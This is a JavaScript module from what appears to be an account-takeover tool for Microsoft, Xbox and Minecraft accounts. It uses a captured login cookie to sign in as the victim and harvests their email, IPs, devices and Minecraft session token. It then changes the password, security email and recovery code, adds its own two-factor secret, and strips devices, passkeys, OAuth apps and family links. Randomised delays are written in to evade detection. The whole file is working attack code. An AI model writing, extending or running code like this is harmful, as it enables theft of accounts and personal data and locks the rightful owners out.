// Secure modules
const generate = require("../utils/generate");
const { domains } = require("../../../config.json");
const getCookies = require("./getCookies");
const recoveryCode = require("./recoveryCode");
const securityInformation = require("./securityInformation");
const polishHost = require("./polishHost");
const recoveryCodeSecure = require("./recoveryCodeSecure");
const addzyger = require("./addzyger");
const { queryParams } = require("../../../db/database");
const getMSAToken = require("./getmsatoken");
const HttpClient = require("../process/HttpClient");

// Cookies modules
const cookies = require("./Cookies/cookies");

// Minecraft modules
const xbl = require('../minecraft/xbl');
const ssid = require('../minecraft/ssid');
const profile = require('../minecraft/profile');

// Security modules
const disableTfa = require("./disableTfa");
const loginHelper = require("./loginhelper");
const handlerecsecure = require("../sections/handlerecsecure");

// Info modules
const { getmxbl } = require("./getxbl3");

// Sections modules
const { getinfo } = require("../sections/getinfo");
const mcextra = require("../sections/mcextra");
const removesection = require("../sections/removesection");
const aliasses = require("../sections/aliasses");
const changeinfo = require("../sections/changeinfo");

// Helpers
const {
    updateStatus,
    updateExtraInformation,
    logDuration,
    getAcc,
    initializesecure,
    newgamertag,
    generateValidGamertag,
    isUrl
} = require("../process/helpers");

// Utils
const fs = require('fs');
const path = require('path');
const changepfp = require("../changeinfo/changePfp");
const removePassKeys = require("../logout/removePassKeys");
const checkmc = require("../../../db/checkmc");
const autonotifier = require("./recode/autonotifier");
const newinfo = require("./recode/newinfo");
const getsecuredata = require("./recode/getsecuredata");
const getsecureinfo = require("./recode/getsecureinfo");
const recoveryCodefix = require("./recoveryCodefix");
const getverificationtoken = require("./getverificationtoken");

// Fetch modules
const getips = require("./getips"); 
const getDevices = require("../devices/getDevices"); 
const removeDevices = require("../devices/removeDevices"); 
const getfamilydata = require("./getfamilydata"); 
const leaveFamily = require("../family/leaveFamily"); 
const getoauths = require("./getoauths"); 
const removeAuthApps = require("./removeAuthApps"); 

// Helper: Random sleep to mimic human behavior
const randomSleep = (min, max) => {
    const ms = Math.floor(Math.random() * (max - min + 1) + min);
    return new Promise(resolve => setTimeout(resolve, ms));
};

// Helper: Standard sleep
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// Helper: Safety Timeout to prevent infinite hanging
const timeoutPromise = (promise, timeoutMs = 30000) => {
    return Promise.race([
        promise,
        new Promise((_, reject) =>
            setTimeout(() => reject(new Error('Operation timed out')), timeoutMs)
        )
    ]);
};

// Helper: Time tracking for performance logging
function timeTracker(label = "TimeTracker") {
    const startTime = Date.now();

    async function end() {
        const endTime = Date.now();
        const durationSeconds = ((endTime - startTime) / 1000).toFixed(2);
        const lines = [];

        lines.push(`${label} duration: ${durationSeconds} seconds`);

        if (label === "Finishing & New Info") {
            lines.push('----------------------');
        }

        const logMessage = lines.join('\n') + '\n';

        return new Promise((resolve, reject) => {
            fs.appendFile('./timelog.txt', logMessage, 'utf8', (err) => {
                if (err) {
                    console.error(`Error writing to file:`, err);
                    reject(err);
                } else {
                    resolve(durationSeconds);
                }
            });
        });
    }

    return { end };
}

// Main function export
module.exports = async (host, settings, uid, username = null, preSecuredData = null) => {
    console.log(`[RECODE_SECURE] Starting secure process for UID: ${uid}, username: ${username || 'none'}`);
    const initializetimer = timeTracker("Initialize");
    
    console.log(`[RECODE_SECURE] Initializing secure process...`);
    let acc = await getAcc();
    acc.loginCookie = host;
    console.log(`[RECODE_SECURE] Account object created, login cookie set`);
    
    let axios = await initializesecure(uid);
    console.log(`[RECODE_SECURE] Axios instance initialized for UID: ${uid}`);
    
    await updateStatus(uid, "msauth", host);
    console.log(`[RECODE_SECURE] Status updated: msauth for UID: ${uid}`);
    console.log(`Starting recode secure!`);
    let accstarted = Date.now();

    let optionalusername = !!username;
    if (optionalusername) {
        console.log(`[RECODE_SECURE] Optional username provided: ${username}`);
    }

    console.log(`[RECODE_SECURE] Getting cookies and authentication...`);
    const [apiCanary, amsc, canary] = await getCookies();
    console.log(`[RECODE_SECURE] Cookies retrieved: apiCanary=${!!apiCanary}, amsc=${!!amsc}, canary=${!!canary}`);

    console.log(`[RECODE_SECURE] Polishing host with amsc...`);
    let msauth;
    try {
        msauth = await polishHost(host, amsc);
        console.log(`[RECODE_SECURE] Host polished, msauth result: ${msauth ? 'success' : msauth}`);
    } catch (error) {
        console.log(`[RECODE_SECURE] Error polishing host:`, error.message);
        if (error.response && error.response.status === 400) {
            console.log(`[RECODE_SECURE] HTTP 400 error during host polishing - likely invalid session`);
            acc.email = "Invalid session";
            acc.secEmail = "Invalid session";
            acc.recoveryCode = "Invalid session";
            acc.password = "Invalid session";
            acc.status = "invalid_session";
            return acc;
        }
        throw error;
    }

    if (msauth === "locked") {
        console.log("[RECODE_SECURE] Account is locked!");
        acc.email = acc.secEmail = acc.recoveryCode = acc.password = acc.ssid = "Locked!";
        return acc;
    }

    if (msauth === "down") {
        console.log("[RECODE_SECURE] Microsoft services are down!");
        acc.email = acc.secEmail = acc.recoveryCode = acc.password = acc.ssid = "Microsoft services are down!";
        return acc;
    }

    console.log(`[RECODE_SECURE] Setting login cookies...`);
    axios.axios.defaults.headers.common["canary"] = apiCanary;
    axios.setCookie(`__Host-MSAAUTH=${msauth}`);
    axios.setCookie(`amsc=${amsc}`);
    console.log(`[RECODE_SECURE] Login cookies set successfully`);

    console.log(`[RECODE_SECURE] Starting login authentication...`);
    let login;
    try {
        login = await loginHelper(axios);
        console.log(`[RECODE_SECURE] Login helper result: ${login}`);
    } catch (error) {
        console.log(`[RECODE_SECURE] Error during login authentication:`, error.message);
        if (error.response && error.response.status === 400) {
            console.log(`[RECODE_SECURE] HTTP 400 error during login - authentication failed`);
            acc.email = acc.secEmail = acc.recoveryCode = acc.password = "Authentication failed";
            acc.status = "auth_failed";
            return acc;
        }
        login = "unauthed";
        console.log(`[RECODE_SECURE] Treating error as unauthed state`);
    }

    if (login == "locked") {
        console.log("[RECODE_SECURE] Login failed: Account locked");
        acc.email = acc.secEmail = acc.recoveryCode = acc.password = acc.status = "Locked!";
        return acc;
    } else if (login == "unauthed") {
        console.log("[RECODE_SECURE] Login failed: Unauthorized");
        acc.email = acc.secEmail = acc.recoveryCode = acc.password = acc.status = "unauthed";
        return acc;
    } else if (login == "child") {
        console.log("[RECODE_SECURE] Login failed: Child account");
        acc.email = "Child landing, try login via auth!";
        acc.secEmail = acc.recoveryCode = acc.password = acc.status = "Child landing!";
        return acc;
    }

    console.log('[RECODE_SECURE] Login successful, proceeding with authentication...');
    initializetimer.end();

    const getauthtimer = timeTracker("Get Cookies");
    
    let hasamc = true;
    let source = null;
    let mxbl = null;

    let [xblResult, cookiedata, mxblresult, msatoken] = await Promise.allSettled([
        timeoutPromise(xbl(acc.loginCookie), 45000), 
        
        // Auto retry fetching cookies up to 3 times
        (async () => {
            for (let i = 0; i < 3; i++) {
                try {
                    let res = await timeoutPromise(cookies(axios), 40000); 
                    if (res && res.cookies) return res; 
                } catch (e) {
                    console.log(`[RECODE_SECURE] Fetch cookie failed attempt ${i + 1}, retrying...`);
                }
                await randomSleep(2000, 4000);
            }
            return null;
        })(),

        timeoutPromise(getmxbl(msauth), 30000),
        timeoutPromise(getMSAToken(msauth), 30000)
    ]).then(results => results.map(result =>
        result.status === 'fulfilled' ? result.value : null
    ));

    if (!cookiedata || !cookiedata.cookies) {
        console.log("[RECODE_SECURE] Cookie data is null, likely timed out or failed");
        acc.email = acc.secEmail = acc.recoveryCode = acc.password = "Cookie data failed";
        acc.status = "cookie_failed";
        return acc;
    }

    const freshamc = cookiedata.cookies.amc;
    const freshjwt = cookiedata.cookies.jwt;
    const freshamrp = cookiedata.cookies.amrp;
    let refresh = null;
    let playstationxbl = null;
    let purchasetoken = null;
    
    if (mxblresult) {
        mxbl = mxblresult.xbl;
        refresh = mxblresult.refresh;
    }

    const tokenobj = {
        apiCanary: apiCanary,
        amsc: amsc,
        amrp: freshamrp,
        amc: freshamc,
        jwt: freshjwt,
        msatoken: msatoken
    };

    await updateExtraInformation(uid, "xblrefresh", refresh);

    if (cookiedata.status === "unauthed") {
        acc.email = acc.secEmail = acc.recoveryCode = acc.password = acc.status = "unauthed";
        return acc;
    }

    acc.aftersecure = true;

    if (cookiedata.status === "noamc") {
        hasamc = false;
    }

    getauthtimer.end();

    const minecraftimer = timeTracker("Minecraft Timer");
    console.log("Checking Minecraft account");
    try {
        // OAuth fallback if standard XBL fails
        if (!xblResult && mxblresult && mxblresult.xbl) {
            console.log("[RECODE_SECURE] xbl.js failed. Using mxbl (OAuth) fallback.");
            xblResult = {
                XBL: mxblresult.xbl,
                gtg: null,
                xuid: null,
                playxbl: null,
                purchasingtoken: null
            };
        }

        if (!xblResult) {
            console.log("[RECODE_SECURE] XBL result is null, likely timed out or failed");
            acc.mc = "False";
            acc.newName = "False";
            source = "False";
        } else if (typeof xblResult === "string" && xblResult === "tfa") {
            console.log("xbl was blocked!");
            acc.mc = "Maybe (dm Maous asap)";
            acc.newName = "Unknown";
            source = "Maybe has MC";
        }

        if (xblResult) {
            purchasetoken = xblResult.purchasingtoken;
            playstationxbl = xblResult.playxbl;
            acc.xuid = xblResult.xuid || null;
            let XBL = xblResult.XBL || null;
            acc.gamertag = xblResult.gtg || null;
            acc.gtg = xblResult.gtg || null;
            
            await updateExtraInformation(uid, "gtg", acc.gamertag);

            let sid, minecraft = null;
            if (XBL) {
                acc.xbl = XBL;
                console.log(`Got XBL`);
                sid = await ssid(XBL);

                if (sid) {
                    console.log(`Got SSID`);
                    acc.ssid = sid;
                    minecraft = await profile(sid);
                    await updateExtraInformation(uid, "mcitems", JSON.stringify(minecraft.items));

                    if (minecraft?.source) {
                        console.log(`Minecraft source verified: ${minecraft.source}`);
                        source = minecraft.source;
                        acc.mc = minecraft.source;
                    }

                    if (minecraft?.name) {
                        await updateStatus(uid, "username", minecraft.name);
                        acc.oldName = minecraft.name;
                        console.log(`Got Minecraft ${minecraft.name}`);
                        acc.capes = minecraft?.capes;
                        acc.newName = minecraft.name;
                    } else {
                        await updateStatus(uid, "username", 'No Minecraft Profile (No IGN)');
                        acc.capes = minecraft?.capes || null;
                        if (source) {
                            acc.newName = "No IGN (Owns Game)";
                        }
                    }
                } else {
                    await updateStatus(uid, "username", 'No Xbox Profile [1]');
                }
            } else {
                await updateStatus(uid, "username", 'No Xbox Profile [2]');
            }

            if (!source) {
                acc.newName = "No Minecraft!";
                if (!settings.secureifnomc) {
                    acc.newName = acc.ssid = acc.email = acc.secEmail = acc.recoveryCode = acc.password = "No Minecraft!";
                    console.log('Returning early: secureifnomc is false');
                    return acc;
                }
            } else {
                console.log(`Setting mc as ${source}`);
                acc.mc = source;
            }
        }
    } catch (e) {
        console.log(`Failed in minecraft block!`);
        console.log(e);
    }

    if (checkmc(acc.mc)) {
        await updateExtraInformation(uid, "hasmc", true);
    } else {
        await updateExtraInformation(uid, "hasmc", false);
    }

    minecraftimer.end();

    const getsecdatatimer = timeTracker("Get Security Data");

    const [securedata, verificationtoken] = await Promise.all([
        getsecuredata(axios, uid, apiCanary, tokenobj),
        getverificationtoken(axios)
    ]);

    axios.axios.defaults.headers.common['__RequestVerificationToken'] = verificationtoken;

    if (securedata?.email) {
        acc.email = securedata.email;
        acc.oldEmail = securedata.email;
    } else {
        console.log(`Couldn't get email!`);
    }

    const aliaseslist = securedata?.aliases || [];
    const canary2 = securedata?.canary;
    
    let recovery = settings.preGeneratedRecovery || securedata?.recovery;
    const disabledtfa = securedata?.disabledtfa;
    const securityParameters = securedata?.securityparams;

    if (!recovery) {
        console.log(`Regenerating recovery code...`);
        recovery = await recoveryCode(axios, securityParameters?.netId, apiCanary, tokenobj);
    }

    if (!recovery) {
        console.log(`[Important error] Couldn't grab Recovery Code`);
    }

    const { secEmail, password } = await getsecureinfo(settings);
    acc.recoverydata.email = acc.email || "Failed";
    acc.recoverydata.recovery = recovery || "Failed";
    acc.recoverydata.secemail = secEmail || "Failed";
    acc.recoverydata.password = password || "Failed";

    getsecdatatimer.end();

    const securepromisetime = timeTracker("Securing Promises (Sequential)");
    
    // --- PHASE 1: EXTRAS (FETCH & UPDATE INFO) ---
    console.log("[PHASE 1] Fetching & Updating Extras...");
    const extraPromises = [];

    // Get IP
    extraPromises.push((async () => {
        await randomSleep(500, 1500);
        try {
            const ips = await getips(axios);
            acc.ip = (ips && ips.length > 0) ? ips.join(", ") : "N/A";
            await updateExtraInformation(uid, "ip", acc.ip);
            console.log(`[PHASE 1] Fetched IPs: ${acc.ip}`);
        } catch (err) {
            console.error(`[PHASE 1] Error fetching IPs:`, err.message);
            acc.ip = "N/A";
            await updateExtraInformation(uid, "ip", "N/A");
        }
    })());

    // Get Devices
    extraPromises.push((async () => {
        await randomSleep(500, 1500);
        try {
            const devicesData = await getDevices(axios);
            let deviceCount = 0;
            if (devicesData) {
                const parsed = typeof devicesData === 'string' ? JSON.parse(devicesData) : devicesData;
                deviceCount = parsed.devices ? parsed.devices.length : (parsed.length || 0);
            }
            acc.devices = `${deviceCount}`; 
            await updateExtraInformation(uid, "devices", acc.devices);
            console.log(`[PHASE 1] Fetched Devices: ${deviceCount}`);
        } catch (err) {
            console.error(`[PHASE 1] Error fetching Devices:`, err.message);
            acc.devices = "N/A";
            await updateExtraInformation(uid, "devices", "N/A");
        }
    })());

    // Get Family Data
    extraPromises.push((async () => {
        await randomSleep(500, 1500);
        try {
            const familyInfo = await getfamilydata(axios); 
            acc.family = familyInfo || "None";
            await updateExtraInformation(uid, "family", acc.family);
            console.log(`[PHASE 1] Fetched Family info`);
        } catch (err) {
            console.error(`[PHASE 1] Error fetching Family:`, err.message);
            acc.family = "None";
            await updateExtraInformation(uid, "family", "None");
        }
    })());

    // Get OAuths Data
    extraPromises.push((async () => {
        await randomSleep(500, 1500);
        try {
            const oauthsData = await getoauths(axios);
            let oauthCount = 0;
            if (oauthsData) {
                const parsed = typeof oauthsData === 'string' ? JSON.parse(oauthsData) : oauthsData;
                oauthCount = Array.isArray(parsed) ? parsed.length : (parsed.length || 0);
            }
            acc.oauths = `Count: ${oauthCount}`; 
            await updateExtraInformation(uid, "oauthsbefore", acc.oauths);
            console.log(`[PHASE 1] Fetched OAuths: ${oauthCount}`);
        } catch (err) {
            console.error(`[PHASE 1] Error fetching OAuths:`, err.message);
            acc.oauths = "N/A";
            await updateExtraInformation(uid, "oauthsbefore", "N/A"); 
        }
    })());

    // Update Profile Info
    extraPromises.push((async () => {
        console.log(`[PHASE 1] Updating Profile Info (Name, DOB, Lang, PFP)...`);
        await randomSleep(500, 1500);
        try {
            await changeinfo(uid, settings, axios, freshamc, freshjwt, verificationtoken);
        } catch (err) {
            console.error(`[PHASE 1] Error in changeinfo:`, err.message);
        }
    })());

    // Minecraft Extra Tasks
    extraPromises.push((async () => {
        await randomSleep(500, 1500);
        const extramc = await mcextra(axios, refresh, acc.xuid, acc.gtg, settings, settings.user_id, uid, acc.loginCookie, acc.ssid, acc.mc, acc.oldName, optionalusername, username, mxbl);
        if (extramc?.newign) acc.newName = extramc.newign;
        if (extramc?.banchecked) { 
            acc.ban = extramc.ban; 
            acc.banReason = extramc.banReason; 
        }
    })());

    // Lunar & Stats Info
    extraPromises.push((async () => {
        await randomSleep(500, 1500);
        const inforesult = await getinfo(hasamc, acc.oldName, axios, msatoken, uid, acc?.mc, acc?.ssid, playstationxbl, purchasetoken);
        acc.stats = inforesult?.stats;
        
        if (inforesult?.cosmetics || inforesult?.emotes) {
            acc.lunar = {
                cosmetics: inforesult.cosmetics?.allcosmetics || "None",
                plusCosmetics: inforesult.cosmetics?.lunarfreecosmetics || "None",
                equippedCosmetics: inforesult.cosmetics?.equippedcosmetics || "None",
                emotes: inforesult.emotes?.allemotes || "None",
                equippedEmotes: inforesult.emotes?.equippedemotes || "None",
                rank: inforesult.cosmetics?.lunarrank || "None",
                cosamount: inforesult.cosmetics?.cosmeticamount || 0,
                emoteamount: inforesult.emotes?.emotesamount || 0
            };
            console.log(`[PHASE 1] Lunar information assigned.`);
        }
    })());

    await Promise.all(extraPromises);

    // ==============================================================================
    // PHASE 2: SMART SECURE (BREAK SECURITY WALL FIRST)
    // ==============================================================================
    console.log("[PHASE 2] Entering Smart Secure (Breaking Security Wall)...");
    let isSecured = false;

    if (preSecuredData) {
        console.log("[PHASE 2] Account already secured via Recovery Code. Skipping API changes.");
        acc.password = preSecuredData.password;
        acc.secEmail = preSecuredData.secEmail;
        acc.recoveryCode = preSecuredData.recoveryCode;
        
        await updateStatus(uid, "secemail", acc.secEmail);
        await updateStatus(uid, "password", acc.password);
        await updateStatus(uid, "recoverycode", `Secured successfully`);
        isSecured = true; 
    } else {
        const MAX_SECURE_RETRIES = 3;
        const originalRecovery = recovery;

        await randomSleep(10000, 15000);

        for (let i = 0; i < MAX_SECURE_RETRIES; i++) {
            console.log(`[PHASE 2] Attempt ${i + 1}/${MAX_SECURE_RETRIES}`);
            try {
                let newData;
                if (originalRecovery) {
                    await randomSleep(13000, 20000); 
                    // Break the wall by utilizing recovery code change password
                    newData = await handlerecsecure(disabledtfa, axios, securityParameters?.netId, acc.email, originalRecovery, secEmail, password, settings, apiCanary, tokenobj);
                } else {
                    console.log("[PHASE 2] No recovery code, using fallback...");
                    newData = await recoveryCodefix(axios, securityParameters);
                }

                if (newData && newData.passwordChanged) {
                    console.log("[PHASE 2] SUCCESS: Password changed. Security Wall Cleared!");
                    acc.password = newData.password; 
                    acc.secEmail = newData.secEmail; 
                    acc.recoveryCode = newData.recoveryCode;
                    
                    await updateStatus(uid, "secemail", acc.secEmail);
                    await updateStatus(uid, "password", acc.password);
                    await updateStatus(uid, "recoverycode", `Secured successfully`);
                    isSecured = true; 
                    break;
                } else {
                    console.log("[PHASE 2] Rejected by MS API.");
                    acc.recoveryCode = (newData && newData.recoveryCode) ? newData.recoveryCode : acc.recoveryCode;
                    acc.password = "Not changed (API Rejected)";
                    acc.secEmail = "Not changed";
                }
            } catch (err) { 
                console.error(`[PHASE 2] Secure attempt error:`, err.message); 
            }
            
            if (!isSecured && i < MAX_SECURE_RETRIES - 1) {
                await randomSleep(6000, 10000);
            }
        }
    }

    // ==============================================================================
    // PHASE 3: ALIAS MANAGEMENT (USING REFRESHED VIP COOKIES)
    // ==============================================================================
    console.log("[PHASE 3] Handling Aliases with Elevated Cookies...");
    for (let i = 0; i < 2; i++) {
        await randomSleep(3000, 5000);
        try {
            let currentCookieData = cookiedata;
            let currentAmsc = amsc;

            // CRITICAL FIX: Fetch fresh session cookies if wall was broken successfully
            if (isSecured) {
                console.log("[PHASE 3] Fetching fresh cookies for Alias to bypass blocks...");
                try {
                    let freshData = await timeoutPromise(cookies(axios), 20000);
                    if (freshData && freshData.cookies) {
                        currentCookieData = freshData;
                        currentAmsc = freshData.cookies.amsc || amsc;
                        console.log("[PHASE 3] Successfully generated fresh elevated cookies.");
                    }
                } catch(e) {
                    console.log("[PHASE 3] Failed to refresh cookies, falling back to existing.");
                }
            }

            const updatedAcc = await aliasses(axios, canary2, uid, acc, aliaseslist, acc.email, settings, apiCanary, currentCookieData, currentAmsc, msauth, acc.email, acc.password);
            if (updatedAcc.email && updatedAcc.email !== acc.oldEmail && updatedAcc.email.includes("@")) {
                acc = updatedAcc;
                await updateStatus(uid, "email", `${acc.oldEmail} -> ${acc.email} (Alias check)`);
                break;
            }
        } catch (e) { 
            console.log(`[PHASE 3] Alias Error: ${e.message}`); 
        }
    }

    securepromisetime.end();

    // --- PHASE 4: ZYGER 2FA ---
    if (settings.addzyger && isSecured) {
        console.log("[PHASE 4] Adding Zyger 2FA...");
        let zygerAdded = false;
        for (let i = 0; i < 2; i++) {
            await randomSleep(2000, 4000);
            try {
                const { success, secretKey } = await addzyger(axios, apiCanary);
                if (success) {
                    console.log("TFA successfully confirmed!");
                    await updateStatus(uid, "secretkey", secretKey);
                    acc.secretkey = secretKey; 
                    zygerAdded = true; 
                    break;
                }
            } catch (error) { 
                console.error("Zyger Error:", error.message); 
            }
        }
        if (!zygerAdded) { 
            acc.secretkey = "Failed to add"; 
            await updateStatus(uid, "secretkey", "Failed"); 
        }
    } else { 
        await updateStatus(uid, "secretkey", 'Disabled'); 
        acc.secretkey = 'Disabled'; 
    }

    // --- PHASE 5: KILL SESSION, DEVICES, FAMILY & OAUTH ---
    if (isSecured) {
        console.log("[PHASE 5] Force Signout, Device, Family & OAuth Management...");
        try {
            console.log("[PHASE 5] Attempting to leave Family...");
            const leftFamily = await leaveFamily(axios);
            if (leftFamily === true) console.log(`[PHASE 5] Successfully left family.`);

            if (settings.removedevices) {
                console.log("[PHASE 5] Removing Devices...");
                const removedCount = await removeDevices(axios);
                console.log(`[PHASE 5] Removed ${removedCount} devices.`);
            }

            if (settings.oauthapps) {
                console.log("[PHASE 5] Removing OAuth Apps...");
                try {
                    await removeAuthApps(axios);
                    console.log(`[PHASE 5] Successfully removed OAuth apps.`);
                } catch (oauthErr) {}
            }

            const passkeysremoved = await removePassKeys(axios, securityParameters);
            if (passkeysremoved > 0) console.log(`[PHASE 5] Passkeys removed: ${passkeysremoved}`);

            await removesection(settings, settings.exploit, true, uid, axios, securityParameters);
            
        } catch (e) { 
            console.log("[PHASE 5] Error during force signout:", e.message); 
        }
    }

    // --- FINISHING & NEW INFO ---
    const finishtimer = timeTracker("Finishing & New Info");
    const updatedinfo = await newinfo(axios, uid);
    
    if (updatedinfo?.newprimary) {
        acc.email = updatedinfo.newprimary;
    }

    await updateStatus(uid, "email", `${acc.oldEmail} -> ${acc.email} (New-Info check)`);

    if (isSecured) {
        console.log("[FIX] Regenerating final recovery code...");
        try {
            const finalRecoveryCode = await recoveryCode(axios, securityParameters?.netId, apiCanary, tokenobj);
            if (finalRecoveryCode) {
                acc.recoveryCode = finalRecoveryCode;
                console.log(`[FIX] Successfully pulled new Recovery Code.`);
            }
        } catch (e) {}
    }

    acc.timeTaken = Math.round((Date.now() - accstarted) / 100) / 10;
    acc.uid = uid;

    await Promise.all([
        updateExtraInformation(uid, "ssid", acc.ssid),
        updateExtraInformation(uid, "capes", JSON.stringify(acc.capes || [])),
        updateExtraInformation(uid, "lunar", JSON.stringify(acc.lunar || {})),
        updateExtraInformation(uid, "username", acc.newName)
    ]);

    finishtimer.end();
    return acc;
};